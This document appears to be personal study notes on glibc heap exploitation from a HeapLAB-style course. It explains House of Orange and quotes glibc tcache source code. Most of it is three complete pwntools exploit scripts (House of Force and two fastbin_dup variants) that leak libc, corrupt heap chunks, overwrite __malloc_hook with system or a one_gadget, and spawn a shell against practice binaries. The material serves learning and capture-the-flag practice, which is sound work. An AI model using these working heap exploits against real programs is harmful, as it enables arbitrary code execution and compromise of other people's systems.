![[HeapLAB_Bible.pdf]]

#### [Heap source code](https://elixir.bootlin.com/glibc/glibc-2.38.9000/source)

## Overview
#### House of Orange
> Place a bin in the unsortedbin and overwrite the bk. This does the unsortedbinattack and writes the address of the unsortedbin into the fd of where the bk points. 
> Then overwirte the `_IO_list_all` pointer with the unsortedbinattack. This will make it possible to control the `_chain` pointer and point it to a memory region we control. 
> To finish it off, we create a fake `_IO_FILE` struct at the address pointed to by the `_chain` pointer.
> Then call `exit` or return from `main` to trigger clean up of filestreams to make it follow `_IO_list_all` to our fake `_IO_FILE` struct
> 

#### Tcache
When allocating from tcachebin, the key is zeroed out.
```c
/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  Removes chunk from the middle of the
   list.  */
static __always_inline void *
tcache_get_n (size_t tc_idx, tcache_entry **ep)
{
  tcache_entry *e;
  if (ep == &(tcache->entries[tc_idx]))
    e = *ep;
  else
    e = REVEAL_PTR (*ep);

  if (__glibc_unlikely (!aligned_OK (e)))
    malloc_printerr ("malloc(): unaligned tcache chunk detected");

  if (ep == &(tcache->entries[tc_idx]))
      *ep = REVEAL_PTR (e->next);
  else
    *ep = PROTECT_PTR (ep, REVEAL_PTR (e->next));

  --(tcache->counts[tc_idx]);
  e->key = 0;
  return (void *) e;
}
```

```c
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache_key;

  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

Ex:
Malloc chunks then free them. Here there is a use-after-free and we can write to a free chunk and overwrite the fd then malloc that address and write something to it. For example malloc the return address on the stack.
```python
malloc(0, 0x18)
malloc(1, 0x18)

free(0)
free(1)

scanf(1, p64(rip))

malloc(2, 0x18)
malloc(3, 0x18)


scanf(3, p64(elf.sym.win))
quit()
```






## [Find which heap exploit to use](https://kissprogramming.com/heap/heap-search)


### House of Force example script
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./house_of_force
from pwn import *

# Set up pwntools for the correct architecture
elf = exe = context.binary = ELF('./house_of_force')
libc = ELF("../.glibc/glibc_2.28_no-tcache/libc.so.6")
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'../.glibc/glibc_2.28_no-tcache'

def malloc(size, data):
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"data: ")
    io.sendline(data)

target = 0x602010

io = start()


io.recvuntil(b"puts() @ ")
puts_address = int(io.recvline().strip(), 16)

io.recvuntil(b"heap @ ")
heap_address = int(io.recvline().strip(), 16)

log.info("puts_address: " + hex(puts_address))
log.info("heap_address: " + hex(heap_address))
libc.address = libc_base = puts_address - libc.sym.puts
log.info("libc_base: " + hex(libc_base))

malloc(24, b"A"*24 + p64(0xffffffffffffffff))

distance = (libc.sym.__malloc_hook - 0x20) - (heap_address + 0x20)

malloc(distance, "/bin/sh\0")

malloc(24, p64(libc.sym.system))

binsh = next(libc.search(b"/bin/sh"))

io.recvuntil(b"> ")
io.sendline(b"1")
io.recvuntil(b"size: ")
io.sendline(str(heap_address + 0x30).encode())

io.interactive()
```


### Fastbin_dup example script

Use gdb-command `find_fake_fast &__malloc_hook` to find fake chunks. 

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./fastbin_dup
from pwn import *

# Set up pwntools for the correct architecture
elf = exe = context.binary = ELF('./fastbin_dup')
libc = ELF("../.glibc/glibc_2.30_no-tcache/libc.so.6")
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'../.glibc/glibc_2.30_no-tcache'

def malloc(size, data):
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"data: ")
    io.sendline(data)

def free(index):
    io.recvuntil(b"> ")
    io.sendline(b"2")
    io.recvuntil(b"index: ")
    io.sendline(str(index).encode())


io = start()

# leak libc
io.recvuntil(b"puts() @ ")
puts = int(io.recvline().strip(), 16)
libc.address = puts - libc.sym.puts
log.success("puts: " + hex(puts))
log.success("libc: " + hex(libc.address))


io.recvuntil(b"Enter your username: ")
io.sendline(p64(0) + p64(0x71))

malloc(0x68, b"A"*0x68)
malloc(0x68, b"B"*0x68)

free(0)
free(1)
free(0)

malloc(0x68, p64(libc.sym.__malloc_hook - 35)) # i control this
malloc(0x68, b"\x00"*0x68)
malloc(0x68, b"\x00"*0x68)

malloc(0x68, b"AAAABBBBCCCCDDDDEEE" + p64(libc.address + 0xe1fa1))

#binsh = next(libc.search(b"/bin/sh"))

io.recvuntil(b"> ")
io.sendline(b"1")
io.recvuntil(b"size: ")
io.sendline(str(1).encode())

io.interactive()
```

### Fastbin_dup with arguments to /bin/sh
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./fastbin_dup_2
from pwn import *

# Set up pwntools for the correct architecture
elf = exe = context.binary = ELF('./fastbin_dup_2')
libc = ELF("../.glibc/glibc_2.30_no-tcache/libc.so.6")
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''

continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'../.glibc/glibc_2.30_no-tcache'

index = 0

def malloc(size, data):
    global index
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"data: ")
    io.sendline(data)
    index += 1
    return index - 1

def free(index):
    io.recvuntil(b"> ")
    io.sendline(b"2")
    io.recvuntil(b"index: ")
    io.sendline(str(index).encode())


io = start()

io.recvuntil(b"puts() @ ")
leak = int(io.recvline().strip(), 16)
libc.address = leak - 0x6faf0
log.success("libc_base: " + hex(libc.address))


chunkA = malloc(0x48, b"AAAA")
chunkB = malloc(0x48, b"BBBB")

free(chunkA)
free(chunkB)
free(chunkA)


malloc(0x48, p64(0x61))
malloc(0x48, b"CCCC")
malloc(0x48, b"DDDD")


chunkC = malloc(0x58, b"EEEE")
chunkD = malloc(0x58, b"FFFF")

free(chunkC)
free(chunkD)
free(chunkC)


chunkE = malloc(0x58, p64(libc.sym.main_arena + 0x20))
chunkF = malloc(0x58, b"-s" + p64(0))
chunkG = malloc(0x58, b"hallo123")
chunkH = malloc(0x58, p64(0)*6 + p64(libc.sym.__malloc_hook-0x23))

malloc(0x28, b"AAAABBBBCCCCDDDDEEE" + p64(libc.address + 0xe1fa1))

io.recvuntil(b"> ")
io.sendline(b"1")
io.recvuntil(b"size: ")
io.sendline(str("1").encode())

io.interactive()
```

